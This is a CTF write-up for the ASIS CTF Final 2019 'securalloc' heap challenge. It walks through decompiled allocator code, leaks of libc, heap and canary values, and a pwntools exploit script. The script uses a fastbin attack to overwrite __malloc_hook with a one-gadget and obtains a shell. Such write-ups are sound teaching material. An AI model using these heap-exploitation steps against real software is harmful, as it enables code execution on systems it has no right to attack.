---
layout: post
title: Asis CTF Final 2019 - Securalloc
date: 2019-11-29 00:00:00
categories: 
    - ctf
tags:
    - ctf
    - linux
    - x64
    - heap buffer overflow
    - fastbin attack
    - binary exploitation
---

### Sources

[https://github.com/fachrioktavian/ctf-writeup/tree/master/asisfin19/securalloc](https://github.com/fachrioktavian/ctf-writeup/tree/master/asisfin19/securalloc)

### Summary

This is a nice challenge, refresh us about some technique before tcache was inroduce in the recent libc version. There are many approach to solve this challenge, we can use house of force or house of orange. For this post i will use fastbin attack like what Quentinmeffre did in his [post](https://quentinmeffre.fr/exploit/heap/2018/11/02/fastbin_attack.html)

#### Overview

The binary is a general challenge of heap exploitation, there are malloc and free function. But binary implements function `secure_malloc`, `secure_init`, `secure_free`.

`secure_init` is a function to get a canary value from `/dev/urandom`, this canary then is saved in every heap chunk that is created by `secure_malloc`. This canary prevents us to do heap buffer overflow because there will always be a heap canary checking after doing some input to the buffer.

```c
void *secure_init() // libsalloc.so
{
  __int64 v0;
  __int64 v1;
  void *result;
  signed int i;
  FILE *stream;

  stream = fopen("/dev/urandom", "rb");
  if ( !stream )
    exit(1);
  for ( i = 0; i <= 7; ++i )
    fread(&canary, 8uLL, 1uLL, stream);
  fclose(stream);
  v0 = canary;
  LOBYTE(v0) = 0;
  v1 = v0;
  result = &canary;
  canary = v1;
  return result;
}
```

`secure_malloc` does a malloc with a few modification to the chunk including adds size of the chunk and a canary before top chunk.

```c
_DWORD *__fastcall secure_malloc(unsigned int len_buffer) // libsalloc.so
{
  _DWORD *v2;

  v2 = malloc(len_buffer + 16);
  if ( !v2 )
    __abort("Resource depletion (secure_malloc)");
  *v2 = len_buffer;
  v2[1] = len_buffer + 1;
  *(v2 + len_buffer + 8) = canary;
  return v2 + 2;
}
```

`secure_free` does a free to a chunk that pointed by a pointer saved in global variable. This global variable always set to 0 after the chunk is freed, this prevents a double free vulnerability.

```c
void __fastcall secure_free(__int64 a1) // libsalloc.so
{
  int v1;

  if ( a1 )
  {
    v1 = *(a1 - 8);
    if ( *(a1 - 4) - v1 != 1 )
      __abort("*** double free detected ***: <unknown> terminated");
    __heap_chk_fail(a1);
    memset((a1 - 8), 0, (v1 + 16));
    free((a1 - 8));
  }
}
```

Binary's protection:

```terminal
❯ checksec securalloc.elf
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Full RELRO means we can't just overwrite GOT table. We can overwrite `__malloc_hook` or `__free_hook` address to get arbitrary shell from one gadget RCE. And with PIE enable we should leak some address to bypass it.

#### The bugs

1. There are datas left in the heap section that hasn't been cleared. Those are pointers from `FILE` structures and the stream datas from `/dev/urandom`. Those come from `secure_init` function as the function called `fopen()` that lying stream data in heap.

    ```terminal
    pwndbg> x/40gx 0x55cadc53e000
    0x55cadc53e000:	0x0000000000000000	0x0000000000021001
    0x55cadc53e010:	0x00000000fbad240c	0x0000000000000000
    0x55cadc53e020:	0x0000000000000000	0x0000000000000000
    0x55cadc53e030:	0x0000000000000000	0x0000000000000000
    0x55cadc53e040:	0x0000000000000000	0x0000000000000000
    0x55cadc53e050:	0x0000000000000000	0x0000000000000000
    0x55cadc53e060:	0x0000000000000000	0x0000000000000000
    0x55cadc53e070:	0x0000000000000000	0x00007fd6b90d4540 # leak libc_base
    0x55cadc53e080:	0x00000000ffffffff	0x0000000000000000
    0x55cadc53e090:	0x0000000000000000	0x000055cadc53e0f0 # leak heap_base
    0x55cadc53e0a0:	0xffffffffffffffff	0x0000000000000000
    0x55cadc53e0b0:	0x000055cadc53e100	0x0000000000000000
    0x55cadc53e0c0:	0x0000000000000000	0x0000000000000000
    0x55cadc53e0d0:	0x00000000ffffffff	0x0000000000000000
    0x55cadc53e0e0:	0x0000000000000000	0x00007fd6b90d26e0
    0x55cadc53e0f0:	0x0000000000000000	0x0000000000000000
    ```

    ```terminal
    pwndbg> x/40gx 0x55cadc53e000 + 0x200
    0x55cadc53e200:	0x0000000000000000	0x0000000000000000
    0x55cadc53e210:	0x0000000000000000	0x0000000000000000
    0x55cadc53e220:	0x0000000000000000	0x0000000000000000
    0x55cadc53e230:	0x00007fd6b90d2260	0x0000000000020dd1
    0x55cadc53e240:	0xf12516d8ca2e81b4	0x7e8b57554cc982e8
    0x55cadc53e250:	0xd692ccd79c247472	0x5004aee0dc637fc0
    0x55cadc53e260:	0x2c0400e06b223061	0x9c6b2b8d65e498ee
    0x55cadc53e270:	0x6f0e916c6c516f47	0x60dd7ea4d53a72de # leak heap_canary
    0x55cadc53e280:	0xd671437e9d5484b3	0x9e74ed4d0647b99c
    0x55cadc53e290:	0x6b7d8ba7e5cffd57	0xf0d7263adb25d3cd
    0x55cadc53e2a0:	0x3da1c028bde478f0	0xd42751adc0d8454c
    0x55cadc53e2b0:	0xa0024ff9bdfd0f8d	0x8dae4dcbdc733df8
    0x55cadc53e2c0:	0xa0b11197ff8da820	0xe2b9cf092ff1149b
    0x55cadc53e2d0:	0xcd52b1a42921b577	0xab0c51edf9703e49
    0x55cadc53e2e0:	0x33ff1298e2cd6628	0x201acdcc046bcda9
    ```

2. After leaking the heap_canary, we can bypass overflow checker by using function edit in securalloc binary. There isn't any buffer's length checking so we can just insert any data. Stop it by entering `\n` (newline).

    ```c
    int edit_C1A() // securalloc.elf
    {
    printf("Data: ");
    fn_read_B1A(ptr_malloc_202050);
    return puts("Updated!");
    }
    ```

    ```c
    _BYTE *__fastcall fn_read_B1A(_BYTE *buffer) // securalloc.elf
    {
    _BYTE *buf;

    for ( buf = buffer; ; ++buf )
    {
        if ( !read(0, buf, 1uLL) )
        exit(1);
        if ( *buf == '\n' )
        break;
    }
    *buf = 0;
    return (buf - buffer);
    }
    ```

#### Exploitation's scenario

1. Leaking libc_base, heap_base, and heap_canary.

2. Using fastbin attack and overwriting `__malloc_hook` pointer.

3. Get one gadget RCE.

### Exploitation

#### Helpers

For the sake of tidy script.

```python
r = process("./securalloc.elf", aslr=1)
l = ELF("./libc.so.6", checksec=False)
#gdb.attach(r)

def create(r, l):
    r.sendlineafter("> ", "1")
    r.sendlineafter("Size: ", l.__str__())

def edit(r, c):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Data: ", c)

def show(r):
    r.sendlineafter("> ", "3")
    r.recvuntil("Data: ")

def free(r):
    r.sendlineafter("> ", "4")

path_to_libc = 'libc.so.6'
ogt = []
for offset in generate_one_gadget(path_to_libc):
    ogt.append(offset)
```

#### Stage 1. Leaking some information

Using some alignment in creating the chunk, we can easily leak the data we want.

```python
create(r, 0x40)
create(r, 0x8)
show(r)
leak = r.recvline()[:-1:]
leak = leak.ljust(8, "\x00")
l.address = u64(leak)-0x3c5540

create(r, 0x8)
show(r)
leak = r.recvline()[:-1:]
leak = leak.ljust(8, "\x00")
heap_base = u64(leak)-0xf0

for i in range(7):
    create(r, 0x20)
create(r, 0x8)

show(r)
leak = r.recvline()[:-1:]
leak = leak.ljust(8, "\x00")
canary = u64(leak) & 0xffffffffffffff00
```

#### Stage 2. Fastbin attack

To make malloc to return to an arbitrary address is a little bit tricky. malloc checks the size of the chunk that's pointed by fastbin's next free chunk, if the size of the next targeted chunk isn't satisfy `n < size < n + 0xf` (n is previous chunk's size) that malloc will return `fastbin corruption` error. Using technique from Quentinmeffre, we can pad a little bit to achieve arbitrary write to `__malloc_hook`.

```python
create(r, 0x10)
free(r)
create(r, 0x50)
free(r)
create(r, 0x10)
malloc_hook = l.symbols["__malloc_hook"]
realloc = l.symbols["__libc_realloc"]
one = l.address + ogt[0]
ploadx = p64(0)*2 + p64(canary) + p64(0) + p64(0x71) + p64(malloc_hook - 0x23)
edit(r, ploadx)
create(r, 0x50)
create(r, 0x50)
ploady = "\x00"*3 + p64(one) + p64(realloc+16)
edit(r, ploady)
```

We overwrite `__malloc_hook` with `realloc`+0x10 function because we need to set appropriate parameter for the one gadget function.

#### Stage 3. Triggering RCE

Simply call malloc to trigger the RCE chain.

```python
create(r, 0x0)
```

#### Pwned

```terminal
❯ python solve.py
[+] Starting local process './securalloc.elf': pid 32328
[*] Stage 1 > Leaking libc_base addr, heap_base addr, and heap_canary value
[+]         > libc_base: 0x7fd6b8d0f000, heap_base: 0x55cadc53e000, heap_canary: 0x60dd7ea4d53a7200
[*] Stage 2 > Fastbin attack
[*] Stage 3 > Triggering RCE
[+] Pwned!
[*] Switching to interactive mode
$ uname -a
Linux fokt 5.0.0-31-generic #33~18.04.1-Ubuntu SMP Tue Oct 1 10:20:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
